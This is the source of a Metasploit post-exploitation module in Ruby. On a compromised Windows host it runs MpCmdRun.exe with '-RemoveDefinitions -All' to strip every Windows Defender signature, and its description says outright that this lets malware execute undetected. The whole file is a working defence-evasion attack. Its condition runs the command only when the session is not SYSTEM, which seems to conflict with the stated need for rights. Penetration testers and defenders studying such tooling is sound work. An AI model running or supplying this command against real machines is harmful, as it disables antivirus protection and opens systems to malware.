##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Disable Windows Defender Signatures',
      'Description'   => %q{
        This module with appropriate rights let to use the Windows Defender command-line utility a run and automation
        tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.
        The tool is prominently used for scheduling scans and updating the signature or definition files,
        but there is a switch created to restore the installed signature definitions to a previous backup copy or
        to the original default set of signatures which is none, disabling all the signatures and allowing malware
        to execute even with the Windows Defender solution enabled.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['metasploit@csiete.org',
      'luisco100 <luisco100[at]gmail.com>'], # Module author
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      ))
  end

  def run
    unless is_system?()
      print_status("Remove Definitions Windows Defender")
      cmd = cmd_exec('cmd.exe', "/c \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All")
      print_status("#{cmd}")
    end
  end
end
